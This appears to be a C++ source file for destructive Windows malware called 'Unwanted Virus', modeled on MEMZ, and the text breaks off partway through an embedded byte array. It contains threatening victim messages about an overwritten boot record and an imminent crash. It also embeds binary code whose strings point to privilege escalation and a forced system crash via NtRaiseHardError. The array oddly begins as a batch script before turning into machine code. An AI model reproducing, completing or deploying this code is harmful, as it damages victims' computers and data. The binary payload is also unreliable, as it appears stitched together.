/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x41, 0x18, 0x75, 0x12, 0x83, 0x79, 0x74, 0x0E, 0x76, 0x0C, 0x83, 0xB9,
0xE8, 0x00, 0x00, 0x00, 0x00, 0x74, 0x03, 0xB0, 0x01, 0xC3, 0x32, 0xC0,
0xC3, 0x68, 0x0D, 0x1B, 0x40, 0x00, 0xFF, 0x15, 0x50, 0x20, 0x40, 0x00,
0xC3, 0x55, 0x8B, 0xEC, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8B, 0x37, 0x81,
0x3E, 0x63, 0x73, 0x6D, 0xE0, 0x75, 0x25, 0x83, 0x7E, 0x10, 0x03, 0x75,
0x1F, 0x8B, 0x46, 0x14, 0x3D, 0x20, 0x05, 0x93, 0x19, 0x74, 0x1D, 0x3D,
0x21, 0x05, 0x93, 0x19, 0x74, 0x16, 0x3D, 0x22, 0x05, 0x93, 0x19, 0x74,
0x0F, 0x3D, 0x00, 0x40, 0x99, 0x01, 0x74, 0x08, 0x5F, 0x33, 0xC0, 0x5E,
0x5D, 0xC2, 0x04, 0x00, 0xE8, 0xD0, 0x02, 0x00, 0x00, 0x89, 0x30, 0x8B,
0x77, 0x04, 0xE8, 0xCC, 0x02, 0x00, 0x00, 0x89, 0x30, 0xE8, 0x61, 0x03,
0x00, 0x00, 0xCC, 0x83, 0x25, 0x70, 0x33, 0x40, 0x00, 0x00, 0xC3, 0x53,
0x56, 0xBE, 0x48, 0x26, 0x40, 0x00, 0xBB, 0x48, 0x26, 0x40, 0x00, 0x3B,
0xF3, 0x73, 0x19, 0x57, 0x8B, 0x3E, 0x85, 0xFF, 0x74, 0x0A, 0x8B, 0xCF,
0xFF, 0x15, 0x04, 0x21, 0x40, 0x00, 0xFF, 0xD7, 0x83, 0xC6, 0x04, 0x3B,
0xF3, 0x72, 0xE9, 0x5F, 0x5E, 0x5B, 0xC3, 0x53, 0x56, 0xBE, 0x50, 0x26,
0x40, 0x00, 0xBB, 0x50, 0x26, 0x40, 0x00, 0x3B, 0xF3, 0x73, 0x19, 0x57,
0x8B, 0x3E, 0x85, 0xFF, 0x74, 0x0A, 0x8B, 0xCF, 0xFF, 0x15, 0x04, 0x21,
0x40, 0x00, 0xFF, 0xD7, 0x83, 0xC6, 0x04, 0x3B, 0xF3, 0x72, 0xE9, 0x5F,
0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0x68, 0x15, 0x1C, 0x40, 0x00, 0x64, 0xFF, 0x35,
0x00, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x89, 0x6C, 0x24, 0x10,
0x8D, 0x6C, 0x24, 0x10, 0x2B, 0xE0, 0x53, 0x56, 0x57, 0xA1, 0x04, 0x30,
0x40, 0x00, 0x31, 0x45, 0xFC, 0x33, 0xC5, 0x50, 0x89, 0x65, 0xE8, 0xFF,
0x75, 0xF8, 0x8B, 0x45, 0xFC, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF,
0x89, 0x45, 0xF8, 0x8D, 0x45, 0xF0, 0x64, 0xA3, 0x00, 0x00, 0x00, 0x00,
0xC3, 0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0xFF, 0x36, 0xE8, 0xA6,
0x02, 0x00, 0x00, 0xFF, 0x75, 0x14, 0x89, 0x06, 0xFF, 0x75, 0x10, 0xFF,
0x75, 0x0C, 0x56, 0x68, 0xB3, 0x12, 0x40, 0x00, 0x68, 0x04, 0x30, 0x40,
0x00, 0xE8, 0xF5, 0x01, 0x00, 0x00, 0x83, 0xC4, 0x1C, 0x5E, 0x5D, 0xC3,
0x55, 0x8B, 0xEC, 0x83, 0x25, 0x78, 0x33, 0x40, 0x00, 0x00, 0x83, 0xEC,
0x24, 0x83, 0x0D, 0x10, 0x30, 0x40, 0x00, 0x01, 0x6A, 0x0A, 0xFF, 0x15,
0x34, 0x20, 0x40, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xA9, 0x01, 0x00, 0x00,
0x83, 0x65, 0xF0, 0x00, 0x33, 0xC0, 0x53, 0x56, 0x57, 0x33, 0xC9, 0x8D,
0x7D, 0xDC, 0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x89, 0x07, 0x89, 0x77,
0x04, 0x89, 0x4F, 0x08, 0x33, 0xC9, 0x89, 0x57, 0x0C, 0x8B, 0x45, 0xDC,
0x8B, 0x7D, 0xE4, 0x89, 0x45, 0xF4, 0x81, 0xF7, 0x6E, 0x74, 0x65, 0x6C,
0x8B, 0x45, 0xE8, 0x35, 0x69, 0x6E, 0x65, 0x49, 0x89, 0x45, 0xF8, 0x8B,
0x45, 0xE0, 0x35, 0x47, 0x65, 0x6E, 0x75, 0x89, 0x45, 0xFC, 0x33, 0xC0,
0x40, 0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x8D, 0x5D, 0xDC, 0x89, 0x03,
0x8B, 0x45, 0xFC, 0x89, 0x73, 0x04, 0x0B, 0xC7, 0x0B, 0x45, 0xF8, 0x89,
0x4B, 0x08, 0x89, 0x53, 0x0C, 0x75, 0x43, 0x8B, 0x45, 0xDC, 0x25, 0xF0,
0x3F, 0xFF, 0x0F, 0x3D, 0xC0, 0x06, 0x01, 0x00, 0x74, 0x23, 0x3D, 0x60,
0x06, 0x02, 0x00, 0x74, 0x1C, 0x3D, 0x70, 0x06, 0x02, 0x00, 0x74, 0x15,
0x3D, 0x50, 0x06, 0x03, 0x00, 0x74, 0x0E, 0x3D, 0x60, 0x06, 0x03, 0x00,
0x74, 0x07, 0x3D, 0x70, 0x06, 0x03, 0x00, 0x75, 0x11, 0x8B, 0x3D, 0x7C,
0x33, 0x40, 0x00, 0x83, 0xCF, 0x01, 0x89, 0x3D, 0x7C, 0x33, 0x40, 0x00,
0xEB, 0x06, 0x8B, 0x3D, 0x7C, 0x33, 0x40, 0x00, 0x8B, 0x4D, 0xE4, 0x6A,
0x07, 0x58, 0x89, 0x4D, 0xFC, 0x39, 0x45, 0xF4, 0x7C, 0x2F, 0x33, 0xC9,
0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x8D, 0x5D, 0xDC, 0x89, 0x03, 0x89,
0x73, 0x04, 0x89, 0x4B, 0x08, 0x8B, 0x4D, 0xFC, 0x89, 0x53, 0x0C, 0x8B,
0x5D, 0xE0, 0xF7, 0xC3, 0x00, 0x02, 0x00, 0x00, 0x74, 0x0E, 0x83, 0xCF,
0x02, 0x89, 0x3D, 0x7C, 0x33, 0x40, 0x00, 0xEB, 0x03, 0x8B, 0x5D, 0xF0,
0xA1, 0x10, 0x30, 0x40, 0x00, 0x83, 0xC8, 0x02, 0xC7, 0x05, 0x78, 0x33,
0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xF7,
0xC1, 0x00, 0x00, 0x10, 0x00, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x83,
0xC8, 0x04, 0xC7, 0x05, 0x78, 0x33, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00,
0xA3, 0x10, 0x30, 0x40, 0x00, 0xF7, 0xC1, 0x00, 0x00, 0x00, 0x08, 0x74,
0x79, 0xF7, 0xC1, 0x00, 0x00, 0x00, 0x10, 0x74, 0x71, 0x33, 0xC9, 0x0F,
0x01, 0xD0, 0x89, 0x45, 0xEC, 0x89, 0x55, 0xF0, 0x8B, 0x45, 0xEC, 0x8B,
0x4D, 0xF0, 0x6A, 0x06, 0x5E, 0x23, 0xC6, 0x3B, 0xC6, 0x75, 0x57, 0xA1,
0x10, 0x30, 0x40, 0x00, 0x83, 0xC8, 0x08, 0xC7, 0x05, 0x78, 0x33, 0x40,
0x00, 0x03, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xF6, 0xC3,
0x20, 0x74, 0x3B, 0x83, 0xC8, 0x20, 0xC7, 0x05, 0x78, 0x33, 0x40, 0x00,
0x05, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xB8, 0x00, 0x00,
0x03, 0xD0, 0x23, 0xD8, 0x3B, 0xD8, 0x75, 0x1E, 0x8B, 0x45, 0xEC, 0xBA,
0xE0, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0xF0, 0x23, 0xC2, 0x3B, 0xC2, 0x75,
0x0D, 0x83, 0x0D, 0x10, 0x30, 0x40, 0x00, 0x40, 0x89, 0x35, 0x78, 0x33,
0x40, 0x00, 0x5F, 0x5E, 0x5B, 0x33, 0xC0, 0xC9, 0xC3, 0x33, 0xC0, 0x39,
0x05, 0x14, 0x30, 0x40, 0x00, 0x0F, 0x95, 0xC0, 0xC3, 0xFF, 0x25, 0x88,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x84, 0x20, 0x40, 0x00, 0xFF, 0x25, 0x80,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x7C, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xE4,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xE0, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xA0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xD8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xD0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xC8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xAC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xA8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xF0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xEC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xF8,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xBC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xDC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xD4, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xB8,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xCC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0x98,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x90, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xFC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xB0, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xB4,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xE8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xC0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xC4, 0x20, 0x40, 0x00, 0x55, 0x8B, 0xEC,
0x51, 0x83, 0x3D, 0x78, 0x33, 0x40, 0x00, 0x01, 0x7C, 0x66, 0x81, 0x7D,
0x08, 0xB4, 0x02, 0x00, 0xC0, 0x74, 0x09, 0x81, 0x7D, 0x08, 0xB5, 0x02,
0x00, 0xC0, 0x75, 0x54, 0x0F, 0xAE, 0x5D, 0xFC, 0x8B, 0x45, 0xFC, 0x83,
0xF0, 0x3F, 0xA8, 0x81, 0x74, 0x3F, 0xA9, 0x04, 0x02, 0x00, 0x00, 0x75,
0x07, 0xB8, 0x8E, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x02, 0x01, 0x00,
0x00, 0x74, 0x2A, 0xA9, 0x08, 0x04, 0x00, 0x00, 0x75, 0x07, 0xB8, 0x91,
0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x10, 0x08, 0x00, 0x00, 0x75, 0x07,
0xB8, 0x93, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x20, 0x10, 0x00, 0x00,
0x75, 0x0E, 0xB8, 0x8F, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xB8, 0x90, 0x00,
0x00, 0xC0, 0xC9, 0xC3, 0x8B, 0x45, 0x08, 0xC9, 0xC3, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x29, 0x00, 0x00,
0x74, 0x29, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0x9E, 0x29, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB2, 0x28, 0x00, 0x00, 0xBA, 0x28, 0x00, 0x00,
0xCC, 0x28, 0x00, 0x00, 0x5E, 0x2D, 0x00, 0x00, 0xA2, 0x28, 0x00, 0x00,
0x2E, 0x2D, 0x00, 0x00, 0x18, 0x2D, 0x00, 0x00, 0xFE, 0x2C, 0x00, 0x00,
0xE2, 0x2C, 0x00, 0x00, 0xCE, 0x2C, 0x00, 0x00, 0x92, 0x28, 0x00, 0x00,
0x8A, 0x28, 0x00, 0x00, 0x74, 0x28, 0x00, 0x00, 0x48, 0x2D, 0x00, 0x00,
0x60, 0x28, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x94, 0x2C, 0x00, 0x00,
0x72, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x28, 0x00, 0x00,
0x34, 0x29, 0x00, 0x00, 0x46, 0x29, 0x00, 0x00, 0x02, 0x29, 0x00, 0x00,
0x12, 0x29, 0x00, 0x00, 0x20, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x2A, 0x00, 0x00, 0xF8, 0x29, 0x00, 0x00, 0xDA, 0x29, 0x00, 0x00,
0xC4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x58, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x2A, 0x00, 0x00,
0xC2, 0x2A, 0x00, 0x00, 0x8E, 0x2B, 0x00, 0x00, 0xAA, 0x2B, 0x00, 0x00,
0x20, 0x2B, 0x00, 0x00, 0xFA, 0x2A, 0x00, 0x00, 0xD4, 0x2B, 0x00, 0x00,
0xE4, 0x2B, 0x00, 0x00, 0xA0, 0x2A, 0x00, 0x00, 0x2A, 0x2B, 0x00, 0x00,
0x7E, 0x2A, 0x00, 0x00, 0x16, 0x2B, 0x00, 0x00, 0x64, 0x2A, 0x00, 0x00,
0x08, 0x2B, 0x00, 0x00, 0x40, 0x2A, 0x00, 0x00, 0x2E, 0x2A, 0x00, 0x00,
0xC6, 0x2B, 0x00, 0x00, 0xE4, 0x2A, 0x00, 0x00, 0xDC, 0x2A, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xEC, 0x2A, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x5A, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
0x74, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xC1, 0x12, 0x40, 0x00, 0x6C, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x30, 0x40, 0x00,
0x68, 0x30, 0x40, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00,
0x52, 0x74, 0x6C, 0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x50, 0x72, 0x69,
0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x00, 0x00, 0x4E, 0x74, 0x52, 0x61,
0x69, 0x73, 0x65, 0x48, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72,
0x00, 0x00, 0x00, 0x00, 0x53, 0x00, 0x65, 0x00, 0x53, 0x00, 0x68, 0x00,
0x75, 0x00, 0x74, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x6E, 0x00,
0x50, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x69, 0x00, 0x6C, 0x00,
0x65, 0x00, 0x67, 0x00, 0x65, 0x00, 0x00, 0x00, 0x41, 0x00, 0x41, 0x00,
0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x6F, 0x00,
0x77, 0x00, 0x20, 0x00, 0x49, 0x00, 0x20, 0x00, 0x77, 0x00, 0x69, 0x00,
0x6C, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00,
0x6D, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00,
0x20, 0x00, 0x79, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x72, 0x00, 0x20, 0x00,
0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6D, 0x00,
0x00, 0x00, 0x00, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x70, 0x00,
0x20, 0x00, 0x50, 0x00, 0x72, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00,
0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x20, 0x00, 0x4F, 0x00, 0x4B, 0x00,
0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00,
0x84, 0x23, 0x00, 0x00, 0x84, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7C, 0x09, 0xFB, 0x60, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00,
0x14, 0x00, 0x00, 0x00, 0xDC, 0x23, 0x00, 0x00, 0xDC, 0x17, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60, 0x00, 0x00, 0x00, 0x00,
0x0D, 0x00, 0x00, 0x00, 0x54, 0x02, 0x00, 0x00, 0xF0, 0x23, 0x00, 0x00,
0xF0, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBC, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x30, 0x40, 0x00,
0x80, 0x23, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x21, 0x40, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x74, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x15, 0x1C, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53,
0x71, 0xE6, 0x2F, 0x4D, 0xDB, 0x37, 0x8A, 0x47, 0x9B, 0x62, 0x14, 0x62,
0x2D, 0xF8, 0xA9, 0x82, 0x02, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x55,
0x73, 0x65, 0x72, 0x73, 0x5C, 0x4F, 0x45, 0x4D, 0x5C, 0x44, 0x65, 0x73,
0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x44, 0x65, 0x76, 0x5C, 0x63, 0x70, 0x70,
0x5C, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x5C,
0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5C, 0x4D, 0x65, 0x73, 0x73,
0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C,
0x00, 0x10, 0x00, 0x00, 0x41, 0x0F, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
0x04, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
0x00, 0x00, 0x00, 0x00, 0x04, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x30, 0x30, 0x63, 0x66, 0x67, 0x00, 0x00, 0x08, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41,
0x00, 0x00, 0x00, 0x00, 0x0C, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x41, 0x00, 0x00, 0x00,
0x10, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x43, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x14, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41,
0x00, 0x00, 0x00, 0x00, 0x18, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
